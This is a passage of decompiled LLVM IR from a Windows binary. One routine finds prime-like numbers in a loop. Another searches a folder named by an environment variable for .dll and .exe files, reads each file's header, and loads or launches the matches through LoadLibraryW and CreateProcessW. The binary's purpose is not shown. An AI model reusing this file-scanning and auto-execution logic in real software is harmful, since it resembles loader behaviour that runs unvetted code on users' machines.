  store i32 %639, i32* %edx.6.reg2mem, !insn.addr !4865
  store i32 %556, i32* %edi.8.reg2mem, !insn.addr !4865
  br i1 %641, label %dec_label_pc_10008880, label %dec_label_pc_10008890, !insn.addr !4865

dec_label_pc_10008890:                            ; preds = %dec_label_pc_10008880, %dec_label_pc_10008890
  %edi.8.reload = load i32, i32* %edi.8.reg2mem
  %642 = add i32 %edi.8.reload, 1, !insn.addr !4866
  %643 = inttoptr i32 %642 to i8*
  %644 = load i8, i8* %643, align 1, !insn.addr !4866
  %645 = icmp eq i8 %644, 0, !insn.addr !4867
  %646 = icmp eq i1 %645, false, !insn.addr !4868
  store i32 %642, i32* %edi.8.reg2mem, !insn.addr !4868
  br i1 %646, label %dec_label_pc_10008890, label %dec_label_pc_10008898, !insn.addr !4868

dec_label_pc_10008898:                            ; preds = %dec_label_pc_10008890
  %647 = sub i32 %639, %558, !insn.addr !4869
  %648 = load i16*, i16** %stack_var_-67220, align 4, !insn.addr !4870
  %649 = ptrtoint i16* %648 to i32, !insn.addr !4870
  %650 = udiv i32 %647, 4, !insn.addr !4871
  %651 = add i32 %649, 1, !insn.addr !4872
  call void @__asm_rep_movsd_memcpy(i8* %643, i8* nonnull %560, i32 %650), !insn.addr !4873
  %652 = mul i32 %650, %361, !insn.addr !4873
  %653 = add i32 %642, %652, !insn.addr !4873
  %654 = inttoptr i32 %651 to i16*, !insn.addr !4874
  store i16* %654, i16** %stack_var_-67220, align 4, !insn.addr !4874
  %655 = and i32 %647, 3, !insn.addr !4875
  %656 = inttoptr i32 %653 to i8*, !insn.addr !4876
  call void @__asm_rep_movsb_memcpy(i8* %656, i8* %656, i32 %655), !insn.addr !4876
  %657 = add i32 %storemerge.reload, %stack_var_-67232.0.reload, !insn.addr !4877
  %658 = icmp ult i32 %651, 4, !insn.addr !4878
  store i32 %657, i32* %stack_var_-67232.0.reg2mem, !insn.addr !4879
  store i32 %651, i32* %eax.14.reg2mem, !insn.addr !4879
  store i32 %589, i32* %esp.13.reg2mem, !insn.addr !4879
  store i32 2, i32* %ebx.0.reg2mem, !insn.addr !4879
  store i32 3, i32* %esi.1.reg2mem, !insn.addr !4879
  br i1 %658, label %dec_label_pc_10008790, label %dec_label_pc_100088e0, !insn.addr !4879

dec_label_pc_100088e0:                            ; preds = %dec_label_pc_10008898, %dec_label_pc_10008911
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %659 = add i32 %esi.1.reload, -1, !insn.addr !4880
  %660 = icmp slt i32 %659, 2, !insn.addr !4881
  store i32 2, i32* %ecx.11.reg2mem, !insn.addr !4881
  br i1 %660, label %dec_label_pc_100088fe, label %dec_label_pc_100088f0.preheader, !insn.addr !4881

dec_label_pc_100088f0.preheader:                  ; preds = %dec_label_pc_100088e0
  %661 = ashr i32 %esi.1.reload, 31, !insn.addr !4882
  %662 = zext i32 %esi.1.reload to i64, !insn.addr !4883
  %663 = zext i32 %661 to i64, !insn.addr !4883
  %664 = mul i64 %663, 4294967296, !insn.addr !4883
  %665 = or i64 %664, %662, !insn.addr !4883
  store i32 2, i32* %ecx.10.reg2mem
  br label %dec_label_pc_100088f0

dec_label_pc_100088f0:                            ; preds = %dec_label_pc_100088f0.preheader, %dec_label_pc_100088f9
  %ecx.10.reload = load i32, i32* %ecx.10.reg2mem
  %666 = zext i32 %ecx.10.reload to i64, !insn.addr !4883
  %667 = srem i64 %665, %666, !insn.addr !4883
  %668 = trunc i64 %667 to i32, !insn.addr !4883
  %669 = icmp eq i32 %668, 0, !insn.addr !4884
  store i32 %ecx.10.reload, i32* %ecx.11.reg2mem, !insn.addr !4885
  br i1 %669, label %dec_label_pc_100088fe, label %dec_label_pc_100088f9, !insn.addr !4885

dec_label_pc_100088f9:                            ; preds = %dec_label_pc_100088f0
  %670 = add i32 %ecx.10.reload, 1, !insn.addr !4886
  %671 = icmp sgt i32 %670, %659, !insn.addr !4887
  store i32 %670, i32* %ecx.10.reg2mem, !insn.addr !4887
  store i32 %670, i32* %ecx.11.reg2mem, !insn.addr !4887
  br i1 %671, label %dec_label_pc_100088fe, label %dec_label_pc_100088f0, !insn.addr !4887

dec_label_pc_100088fe:                            ; preds = %dec_label_pc_100088f9, %dec_label_pc_100088f0, %dec_label_pc_100088e0
  %ecx.11.reload = load i32, i32* %ecx.11.reg2mem
  %672 = icmp eq i32 %ecx.11.reload, %esi.1.reload, !insn.addr !4888
  %673 = icmp eq i1 %672, false, !insn.addr !4889
  store i32 %ebx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !4889
  br i1 %673, label %dec_label_pc_10008911, label %dec_label_pc_10008902, !insn.addr !4889

dec_label_pc_10008902:                            ; preds = %dec_label_pc_100088fe
  store i32 %esi.1.reload, i32* %627, align 4, !insn.addr !4890
  store i32 ptrtoint ([4 x i8]* @global_var_100393c0 to i32), i32* %629, align 4, !insn.addr !4891
  %674 = call i32 @function_100073c0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !4892
  %675 = add i32 %ebx.0.reload, 1, !insn.addr !4893
  store i32 %675, i32* %ebx.1.reg2mem, !insn.addr !4893
  br label %dec_label_pc_10008911, !insn.addr !4893

dec_label_pc_10008911:                            ; preds = %dec_label_pc_10008902, %dec_label_pc_100088fe
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %676 = add i32 %esi.1.reload, 1, !insn.addr !4894
  %677 = icmp slt i32 %ebx.1.reload, 1001, !insn.addr !4895
  store i32 %ebx.1.reload, i32* %ebx.0.reg2mem, !insn.addr !4895
  store i32 %676, i32* %esi.1.reg2mem, !insn.addr !4895
  br i1 %677, label %dec_label_pc_100088e0, label %dec_label_pc_1000891a, !insn.addr !4895

dec_label_pc_1000891a:                            ; preds = %dec_label_pc_10008911
  %678 = load i32, i32* %stack_var_-67236, align 4, !insn.addr !4896
  store i32 %678, i32* %627, align 4, !insn.addr !4896
  %679 = add i32 %esp.13.reload, -32, !insn.addr !4897
  %680 = inttoptr i32 %679 to i32*, !insn.addr !4897
  store i32 %108, i32* %680, align 4, !insn.addr !4897
  %681 = add i32 %esp.13.reload, -36, !insn.addr !4898
  %682 = inttoptr i32 %681 to i32*, !insn.addr !4898
  store i32 %325, i32* %682, align 4, !insn.addr !4898
  %683 = call i32 @function_1000c480(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4899
  store i32 %589, i32* %esp.12.reg2mem, !insn.addr !4900
  br label %dec_label_pc_10008732, !insn.addr !4900

dec_label_pc_10008949:                            ; preds = %dec_label_pc_1000883a
  %684 = call i32 @___report_rangecheckfailure(), !insn.addr !4901
  %685 = call i32 @__asm_int3(), !insn.addr !4902
  %686 = call i32 @__asm_int3(), !insn.addr !4903
  ret i32 %686, !insn.addr !4903
}

define i32 @function_10008950(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008950:
  %esp.3.reg2mem = alloca i32, !insn.addr !4904
  %esp.2.reg2mem = alloca i32, !insn.addr !4904
  %eax.0.reg2mem = alloca i32, !insn.addr !4904
  %esp.1.reg2mem = alloca i32, !insn.addr !4904
  %esp.0.reg2mem = alloca i32, !insn.addr !4904
  %0 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-2048 = alloca i32, align 4
  %stack_var_-1084 = alloca i32, align 4
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-1876 = alloca i32, align 4
  %stack_var_-2028 = alloca i16*, align 4
  %stack_var_-1072 = alloca i32, align 4
  %stack_var_-1064 = alloca i32, align 4
  %stack_var_-2016 = alloca i16*, align 4
  %stack_var_-1060 = alloca i32, align 4
  %stack_var_-1888 = alloca i128, align 8
  %1 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !4905
  %2 = call i32 @__asm_movaps.34(i128 %1), !insn.addr !4906
  %3 = call i32 @__asm_movaps.34(i128 %1), !insn.addr !4907
  %4 = call i32 @__asm_movaps.34(i128 %1), !insn.addr !4908
  %5 = call i32 @__asm_movaps.34(i128 %1), !insn.addr !4909
  %6 = sext i32 %5 to i128, !insn.addr !4909
  store i128 %6, i128* %stack_var_-1888, align 8, !insn.addr !4909
  %7 = call i32 @__asm_movaps.34(i128 %1), !insn.addr !4910
  %8 = inttoptr i32 %7 to i16*, !insn.addr !4911
  %9 = call i32 @GetEnvironmentVariableW(i16* %8, i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !4911
  %10 = bitcast i32* %stack_var_-1060 to i16*
  store i16* %10, i16** %stack_var_-2016, align 4, !insn.addr !4912
  %11 = ptrtoint i16** %stack_var_-2016 to i32, !insn.addr !4912
  %12 = call i32 @lstrlenW(i16* nonnull %10), !insn.addr !4913
  %13 = mul i32 %12, 2, !insn.addr !4914
  %14 = add i32 %11, 952, !insn.addr !4914
  %15 = add i32 %13, %14, !insn.addr !4914
  %16 = inttoptr i32 %15 to i16*, !insn.addr !4914
  store i16 92, i16* %16, align 2, !insn.addr !4914
  %17 = add i32 %13, 2, !insn.addr !4915
  %18 = icmp ult i32 %17, 1024, !insn.addr !4916
  %19 = icmp eq i1 %18, false, !insn.addr !4917
  br i1 %19, label %dec_label_pc_10008c7e, label %dec_label_pc_10008a0e, !insn.addr !4917

dec_label_pc_10008a0e:                            ; preds = %dec_label_pc_10008950
  %20 = add i32 %17, %14, !insn.addr !4918
  %21 = inttoptr i32 %20 to i16*, !insn.addr !4918
  store i16 0, i16* %21, align 2, !insn.addr !4918
  %22 = bitcast i32* %stack_var_-1064 to i16*
  %23 = call i16* @lstrcatW(i16* nonnull %22, i16* bitcast (i16** @global_var_10040958 to i16*)), !insn.addr !4919
  %24 = bitcast i32* %stack_var_-1072 to i16*
  store i16* %24, i16** %stack_var_-2028, align 4, !insn.addr !4920
  %25 = ptrtoint i16** %stack_var_-2028 to i32, !insn.addr !4920
  %26 = call i32 @lstrlenW(i16* nonnull %24), !insn.addr !4921
  %27 = mul i32 %26, 2, !insn.addr !4922
  %28 = add i32 %25, 952, !insn.addr !4922
  %29 = add i32 %27, %28, !insn.addr !4922
  %30 = inttoptr i32 %29 to i32*, !insn.addr !4922
  store i32 2752604, i32* %30, align 4, !insn.addr !4922
  %31 = add i32 %27, 4, !insn.addr !4923
  %32 = icmp ult i32 %31, 1024, !insn.addr !4924
  %33 = icmp eq i1 %32, false, !insn.addr !4925
  br i1 %33, label %dec_label_pc_10008c7e, label %dec_label_pc_10008a52, !insn.addr !4925

dec_label_pc_10008a52:                            ; preds = %dec_label_pc_10008a0e
  %34 = add i32 %31, %28, !insn.addr !4926
  %35 = inttoptr i32 %34 to i16*, !insn.addr !4926
  store i16 0, i16* %35, align 2, !insn.addr !4926
  %36 = bitcast i32* %stack_var_-1876 to %_WIN32_FIND_DATAW*
  %37 = bitcast i32* %stack_var_-1076 to i16*
  %38 = call i32* @FindFirstFileW(i16* nonnull %37, %_WIN32_FIND_DATAW* nonnull %36), !insn.addr !4927
  %39 = bitcast i32* %stack_var_-1084 to i16*
  %40 = call i32 @lstrlenW(i16* nonnull %39), !insn.addr !4928
  %41 = inttoptr i32 %40 to i16*, !insn.addr !4929
  store i16* %41, i16** %stack_var_-2016, align 4, !insn.addr !4929
  %42 = bitcast i128* %stack_var_-1888 to %_WIN32_FIND_DATAW*
  store i32 ptrtoint (i32* @global_var_100409b8 to i32), i32* %stack_var_-2048, align 4, !insn.addr !4930
  %43 = call i1 @FindNextFileW(i32* nonnull @global_var_100409b8, %_WIN32_FIND_DATAW* nonnull %42), !insn.addr !4931
  %44 = icmp eq i1 %43, false, !insn.addr !4932
  br i1 %44, label %dec_label_pc_10008c6a, label %dec_label_pc_10008ab0.preheader, !insn.addr !4933

dec_label_pc_10008ab0.preheader:                  ; preds = %dec_label_pc_10008a52
  %45 = ptrtoint i32* %stack_var_-2048 to i32, !insn.addr !4930
  %46 = inttoptr i32 %arg1 to i32*
  store i32 %45, i32* %esp.0.reg2mem
  br label %dec_label_pc_10008ab0

dec_label_pc_10008ab0:                            ; preds = %dec_label_pc_10008ab0.preheader, %dec_label_pc_10008c4a
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %47 = add i32 %esp.0.reload, 784, !insn.addr !4934
  %48 = add i32 %esp.0.reload, -4, !insn.addr !4935
  %49 = inttoptr i32 %48 to i32*, !insn.addr !4935
  store i32 %47, i32* %49, align 4, !insn.addr !4935
  %50 = add i32 %esp.0.reload, 196, !insn.addr !4936
  %51 = add i32 %esp.0.reload, -8, !insn.addr !4937
  %52 = inttoptr i32 %51 to i32*, !insn.addr !4937
  store i32 %50, i32* %52, align 4, !insn.addr !4937
  %53 = call i16* @StrStrW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !4938
  %54 = ptrtoint i16* %53 to i32, !insn.addr !4938
  %55 = add i32 %esp.0.reload, 12, !insn.addr !4939
  %56 = inttoptr i32 %55 to i32*, !insn.addr !4939
  store i32 %54, i32* %56, align 4, !insn.addr !4939
  %57 = add i32 %esp.0.reload, 744, !insn.addr !4940
  %58 = inttoptr i32 %57 to i16*, !insn.addr !4940
  store i16 0, i16* %58, align 2, !insn.addr !4940
  %59 = add i32 %esp.0.reload, 736, !insn.addr !4941
  %60 = add i32 %esp.0.reload, -12, !insn.addr !4942
  %61 = inttoptr i32 %60 to i32*, !insn.addr !4942
  store i32 %59, i32* %61, align 4, !insn.addr !4942
  %62 = add i32 %esp.0.reload, 188, !insn.addr !4943
  %63 = inttoptr i32 %59 to i32*, !insn.addr !4944
  store i32 6553646, i32* %63, align 4, !insn.addr !4944
  %64 = add i32 %esp.0.reload, -16, !insn.addr !4945
  %65 = inttoptr i32 %64 to i32*, !insn.addr !4945
  store i32 %62, i32* %65, align 4, !insn.addr !4945
  %66 = add i32 %esp.0.reload, 740, !insn.addr !4946
  %67 = inttoptr i32 %66 to i32*, !insn.addr !4946
  store i32 7077996, i32* %67, align 4, !insn.addr !4946
  %68 = call i16* @StrStrW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !4947
  %69 = add i32 %esp.0.reload, 728, !insn.addr !4948
  %70 = inttoptr i32 %69 to i32*, !insn.addr !4948
  store i32 7864366, i32* %70, align 4, !insn.addr !4948
  %71 = add i32 %esp.0.reload, 732, !insn.addr !4949
  %72 = inttoptr i32 %71 to i32*, !insn.addr !4949
  store i32 7864421, i32* %72, align 4, !insn.addr !4949
  %73 = add i32 %esp.0.reload, -20, !insn.addr !4950
  %74 = inttoptr i32 %73 to i32*, !insn.addr !4950
  store i32 %69, i32* %74, align 4, !insn.addr !4950
  %75 = add i32 %esp.0.reload, 180, !insn.addr !4951
  store i32 101, i32* %63, align 4, !insn.addr !4952
  %76 = add i32 %esp.0.reload, -24, !insn.addr !4953
  %77 = inttoptr i32 %76 to i32*, !insn.addr !4953
  store i32 %75, i32* %77, align 4, !insn.addr !4953
  %78 = call i16* @StrStrW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !4954
  %79 = ptrtoint i16* %78 to i32, !insn.addr !4954
  %80 = add i32 %esp.0.reload, 20, !insn.addr !4955
  %81 = inttoptr i32 %80 to i32*, !insn.addr !4955
  store i32 %79, i32* %81, align 4, !insn.addr !4955
  %82 = load i32, i32* %49, align 4, !insn.addr !4956
  %83 = icmp eq i32 %82, 0, !insn.addr !4957
  %84 = icmp eq i16* %68, null, !insn.addr !4958
  %or.cond = or i1 %84, %83
  store i32 %82, i32* %eax.0.reg2mem, !insn.addr !4959
  store i32 %76, i32* %esp.2.reg2mem, !insn.addr !4959
  br i1 %or.cond, label %dec_label_pc_10008bff, label %dec_label_pc_10008b49, !insn.addr !4959

dec_label_pc_10008b49:                            ; preds = %dec_label_pc_10008ab0
  %85 = add i32 %esp.0.reload, 128, !insn.addr !4960
  %86 = inttoptr i32 %85 to i8*, !insn.addr !4960
  %87 = load i8, i8* %86, align 1, !insn.addr !4960
  %88 = and i8 %87, 16, !insn.addr !4960
  %89 = icmp eq i8 %88, 0, !insn.addr !4960
  %90 = icmp eq i1 %89, false, !insn.addr !4961
  store i32 %82, i32* %eax.0.reg2mem, !insn.addr !4961
  store i32 %76, i32* %esp.2.reg2mem, !insn.addr !4961
  br i1 %90, label %dec_label_pc_10008bff, label %dec_label_pc_10008b57, !insn.addr !4961

dec_label_pc_10008b57:                            ; preds = %dec_label_pc_10008b49
  %91 = add i32 %esp.0.reload, 172, !insn.addr !4962
  %92 = add i32 %esp.0.reload, -28, !insn.addr !4963
  %93 = inttoptr i32 %92 to i32*, !insn.addr !4963
  store i32 %91, i32* %93, align 4, !insn.addr !4963
  %94 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !4964
  %95 = load i32, i32* %94, align 4, !insn.addr !4964
  %96 = mul i32 %95, 2, !insn.addr !4965
  %97 = add i32 %esp.0.reload, 926, !insn.addr !4965
  %98 = add i32 %97, %96, !insn.addr !4965
  %99 = add i32 %esp.0.reload, -32, !insn.addr !4966
  %100 = inttoptr i32 %99 to i32*, !insn.addr !4966
  store i32 %98, i32* %100, align 4, !insn.addr !4966
  %101 = call i16* @lstrcpyW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !4967
  %102 = add i32 %esp.0.reload, -36, !insn.addr !4968
  %103 = inttoptr i32 %102 to i32*, !insn.addr !4968
  store i32 0, i32* %103, align 4, !insn.addr !4968
  %104 = add i32 %esp.0.reload, -40, !insn.addr !4969
  %105 = inttoptr i32 %104 to i32*, !insn.addr !4969
  store i32 128, i32* %105, align 4, !insn.addr !4969
  %106 = add i32 %esp.0.reload, -44, !insn.addr !4970
  %107 = inttoptr i32 %106 to i32*, !insn.addr !4970
  store i32 3, i32* %107, align 4, !insn.addr !4970
  %108 = add i32 %esp.0.reload, -48, !insn.addr !4971
  %109 = inttoptr i32 %108 to i32*, !insn.addr !4971
  store i32 0, i32* %109, align 4, !insn.addr !4971
  %110 = add i32 %esp.0.reload, -52, !insn.addr !4972
  %111 = inttoptr i32 %110 to i32*, !insn.addr !4972
  store i32 1, i32* %111, align 4, !insn.addr !4972
  %112 = add i32 %esp.0.reload, -56, !insn.addr !4973
  %113 = inttoptr i32 %112 to i32*, !insn.addr !4973
  store i32 -2147483648, i32* %113, align 4, !insn.addr !4973
  %114 = add i32 %esp.0.reload, 920, !insn.addr !4974
  %115 = add i32 %esp.0.reload, -60, !insn.addr !4975
  %116 = inttoptr i32 %115 to i32*, !insn.addr !4975
  store i32 %114, i32* %116, align 4, !insn.addr !4975
  %117 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !4976
  %118 = ptrtoint i32* %117 to i32, !insn.addr !4976
  %119 = add i32 %esp.0.reload, -64, !insn.addr !4977
  %120 = inttoptr i32 %119 to i32*, !insn.addr !4977
  store i32 0, i32* %120, align 4, !insn.addr !4977
  %121 = add i32 %esp.0.reload, -68, !insn.addr !4978
  %122 = inttoptr i32 %121 to i32*, !insn.addr !4978
  store i32 %92, i32* %122, align 4, !insn.addr !4978
  %123 = add i32 %esp.0.reload, -72, !insn.addr !4979
  %124 = inttoptr i32 %123 to i32*, !insn.addr !4979
  store i32 60, i32* %124, align 4, !insn.addr !4979
  %125 = add i32 %esp.0.reload, 832, !insn.addr !4980
  %126 = add i32 %esp.0.reload, -76, !insn.addr !4981
  %127 = inttoptr i32 %126 to i32*, !insn.addr !4981
  store i32 %125, i32* %127, align 4, !insn.addr !4981
  %128 = add i32 %esp.0.reload, -80, !insn.addr !4982
  %129 = inttoptr i32 %128 to i32*, !insn.addr !4982
  store i32 %118, i32* %129, align 4, !insn.addr !4982
  %130 = call i1 @ReadFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !4983
  %131 = add i32 %esp.0.reload, -84, !insn.addr !4984
  %132 = inttoptr i32 %131 to i32*, !insn.addr !4984
  store i32 %118, i32* %132, align 4, !insn.addr !4984
  %133 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !4985
  %134 = add i32 %esp.0.reload, 858, !insn.addr !4986
  %135 = inttoptr i32 %134 to i8*, !insn.addr !4986
  %136 = load i8, i8* %135, align 1, !insn.addr !4986
  %137 = icmp eq i8 %136, 0, !insn.addr !4987
  %138 = icmp eq i1 %137, false, !insn.addr !4988
  %139 = load i32, i32* %111, align 4, !insn.addr !4989
  %140 = icmp eq i32 %139, 60, !insn.addr !4989
  %141 = icmp eq i1 %140, %138
  %142 = icmp eq i1 %141, false, !insn.addr !4990
  store i32 %131, i32* %esp.1.reg2mem, !insn.addr !4991
  br i1 %142, label %dec_label_pc_10008bfb, label %dec_label_pc_10008bce, !insn.addr !4991

dec_label_pc_10008bce:                            ; preds = %dec_label_pc_10008b57
  %143 = load i32, i32* %46, align 4, !insn.addr !4992
  %144 = sext i8 %136 to i32, !insn.addr !4993
  %145 = load i32, i32* %109, align 4, !insn.addr !4994
  %146 = mul i32 %143, 4, !insn.addr !4995
  %147 = add i32 %145, %146, !insn.addr !4995
  %148 = inttoptr i32 %147 to i32*, !insn.addr !4995
  store i32 %144, i32* %148, align 4, !insn.addr !4995
  %149 = load i32, i32* %46, align 4, !insn.addr !4996
  %150 = load i32, i32* %107, align 4, !insn.addr !4997
  %151 = add i32 %esp.0.reload, 859, !insn.addr !4998
  %152 = inttoptr i32 %151 to i8*, !insn.addr !4998
  %153 = load i8, i8* %152, align 1, !insn.addr !4998
  %154 = sext i8 %153 to i32, !insn.addr !4998
  %155 = mul i32 %149, 4, !insn.addr !4999
  %156 = add i32 %150, %155, !insn.addr !4999
  %157 = inttoptr i32 %156 to i32*, !insn.addr !4999
  store i32 %154, i32* %157, align 4, !insn.addr !4999
  %158 = add i32 %esp.0.reload, 868, !insn.addr !5000
  %159 = load i32, i32* %46, align 4, !insn.addr !5001
  %160 = add i32 %159, 1, !insn.addr !5001
  store i32 %160, i32* %46, align 4, !insn.addr !5001
  %161 = add i32 %esp.0.reload, -88, !insn.addr !5002
  %162 = inttoptr i32 %161 to i32*, !insn.addr !5002
  store i32 %158, i32* %162, align 4, !insn.addr !5002
  %163 = call i32* @LoadLibraryW(i16* bitcast (i32* @1 to i16*)), !insn.addr !5003
  store i32 %161, i32* %esp.1.reg2mem, !insn.addr !5003
  br label %dec_label_pc_10008bfb, !insn.addr !5003

dec_label_pc_10008bfb:                            ; preds = %dec_label_pc_10008bce, %dec_label_pc_10008b57
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %164 = add i32 %esp.1.reload, 20, !insn.addr !5004
  %165 = inttoptr i32 %164 to i32*, !insn.addr !5004
  %166 = load i32, i32* %165, align 4, !insn.addr !5004
  store i32 %166, i32* %eax.0.reg2mem, !insn.addr !5004
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !5004
  br label %dec_label_pc_10008bff, !insn.addr !5004

dec_label_pc_10008bff:                            ; preds = %dec_label_pc_10008bfb, %dec_label_pc_10008b49, %dec_label_pc_10008ab0
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %167 = add i32 %esp.2.reload, 44, !insn.addr !5005
  %168 = inttoptr i32 %167 to i32*, !insn.addr !5005
  %169 = load i32, i32* %168, align 4, !insn.addr !5005
  %170 = icmp eq i32 %169, 0, !insn.addr !5005
  %171 = icmp eq i32 %eax.0.reload, 0, !insn.addr !5006
  %or.cond11 = or i1 %171, %170
  store i32 %esp.2.reload, i32* %esp.3.reg2mem, !insn.addr !5007
  br i1 %or.cond11, label %dec_label_pc_10008c4a, label %dec_label_pc_10008c0a, !insn.addr !5007

dec_label_pc_10008c0a:                            ; preds = %dec_label_pc_10008bff
  %172 = add i32 %esp.2.reload, 196, !insn.addr !5008
  %173 = add i32 %esp.2.reload, -4, !insn.addr !5009
  %174 = inttoptr i32 %173 to i32*, !insn.addr !5009
  store i32 %172, i32* %174, align 4, !insn.addr !5009
  %175 = add i32 %esp.2.reload, 24, !insn.addr !5010
  %176 = inttoptr i32 %175 to i32*, !insn.addr !5010
  %177 = load i32, i32* %176, align 4, !insn.addr !5010
  %178 = mul i32 %177, 2, !insn.addr !5011
  %179 = add i32 %esp.2.reload, 950, !insn.addr !5011
  %180 = add i32 %179, %178, !insn.addr !5011
  %181 = add i32 %esp.2.reload, -8, !insn.addr !5012
  %182 = inttoptr i32 %181 to i32*, !insn.addr !5012
  store i32 %180, i32* %182, align 4, !insn.addr !5012
  %183 = call i16* @lstrcpyW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !5013
  %184 = add i32 %esp.2.reload, 40, !insn.addr !5014
  %185 = add i32 %esp.2.reload, -12, !insn.addr !5015
  %186 = inttoptr i32 %185 to i32*, !insn.addr !5015
  store i32 %184, i32* %186, align 4, !insn.addr !5015
  %187 = add i32 %esp.2.reload, 56, !insn.addr !5016
  %188 = add i32 %esp.2.reload, -16, !insn.addr !5017
  %189 = inttoptr i32 %188 to i32*, !insn.addr !5017
  store i32 %187, i32* %189, align 4, !insn.addr !5017
  %190 = add i32 %esp.2.reload, -20, !insn.addr !5018
  %191 = inttoptr i32 %190 to i32*, !insn.addr !5018
  store i32 0, i32* %191, align 4, !insn.addr !5018
  %192 = add i32 %esp.2.reload, -24, !insn.addr !5019
  %193 = inttoptr i32 %192 to i32*, !insn.addr !5019
  store i32 0, i32* %193, align 4, !insn.addr !5019
  %194 = add i32 %esp.2.reload, -28, !insn.addr !5020
  %195 = inttoptr i32 %194 to i32*, !insn.addr !5020
  store i32 0, i32* %195, align 4, !insn.addr !5020
  %196 = add i32 %esp.2.reload, -32, !insn.addr !5021
  %197 = inttoptr i32 %196 to i32*, !insn.addr !5021
  store i32 0, i32* %197, align 4, !insn.addr !5021
  %198 = add i32 %esp.2.reload, -36, !insn.addr !5022
  %199 = inttoptr i32 %198 to i32*, !insn.addr !5022
  store i32 0, i32* %199, align 4, !insn.addr !5022
  %200 = add i32 %esp.2.reload, -40, !insn.addr !5023
  %201 = inttoptr i32 %200 to i32*, !insn.addr !5023
  store i32 0, i32* %201, align 4, !insn.addr !5023
  %202 = add i32 %esp.2.reload, -44, !insn.addr !5024
  %203 = inttoptr i32 %202 to i32*, !insn.addr !5024
  store i32 0, i32* %203, align 4, !insn.addr !5024
  %204 = add i32 %esp.2.reload, 944, !insn.addr !5025
  %205 = add i32 %esp.2.reload, -48, !insn.addr !5026
  %206 = inttoptr i32 %205 to i32*, !insn.addr !5026
  store i32 %204, i32* %206, align 4, !insn.addr !5026
  %207 = call i1 @CreateProcessW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i1 ptrtoint (i32* @1 to i1), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, i16* bitcast (i32* @1 to i16*), %_STARTUPINFOW* bitcast (i32* @1 to %_STARTUPINFOW*), %_PROCESS_INFORMATION* bitcast (i32* @1 to %_PROCESS_INFORMATION*)), !insn.addr !5027
  store i32 %205, i32* %esp.3.reg2mem, !insn.addr !5027
  br label %dec_label_pc_10008c4a, !insn.addr !5027

dec_label_pc_10008c4a:                            ; preds = %dec_label_pc_10008c0a, %dec_label_pc_10008bff
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %208 = add i32 %esp.3.reload, 152, !insn.addr !5028
  %209 = add i32 %esp.3.reload, -4, !insn.addr !5029
  %210 = inttoptr i32 %209 to i32*, !insn.addr !5029
  store i32 %208, i32* %210, align 4, !insn.addr !5029
  %211 = add i32 %esp.3.reload, 28, !insn.addr !5030
  %212 = inttoptr i32 %211 to i32*, !insn.addr !5030
  %213 = load i32, i32* %212, align 4, !insn.addr !5030
  %214 = add i32 %esp.3.reload, -8, !insn.addr !5030
  %215 = inttoptr i32 %214 to i32*, !insn.addr !5030
  store i32 %213, i32* %215, align 4, !insn.addr !5030
  %216 = call i1 @FindNextFileW(i32* nonnull @1, %_WIN32_FIND_DATAW* bitcast (i32* @1 to %_WIN32_FIND_DATAW*)), !insn.addr !5031
  %217 = icmp eq i1 %216, false, !insn.addr !5032
  %218 = icmp eq i1 %217, false, !insn.addr !5033
  store i32 %214, i32* %esp.0.reg2mem, !insn.addr !5033
  br i1 %218, label %dec_label_pc_10008ab0, label %dec_label_pc_10008c6a, !insn.addr !5033

dec_label_pc_10008c6a:                            ; preds = %dec_label_pc_10008c4a, %dec_label_pc_10008a52
  %219 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5034
  ret i32 %219, !insn.addr !5035

dec_label_pc_10008c7e:                            ; preds = %dec_label_pc_10008a0e, %dec_label_pc_10008950
  %220 = call i32 @___report_rangecheckfailure(), !insn.addr !5036
  %221 = call i32 @__asm_int3(), !insn.addr !5037
  %222 = call i32 @__asm_int3(), !insn.addr !5038
  %223 = call i32 @__asm_int3(), !insn.addr !5039
  %224 = call i32 @__asm_int3(), !insn.addr !5040
  %225 = call i32 @__asm_int3(), !insn.addr !5041
  %226 = call i32 @__asm_int3(), !insn.addr !5042
  %227 = call i32 @__asm_int3(), !insn.addr !5043
  %228 = call i32 @__asm_int3(), !insn.addr !5044
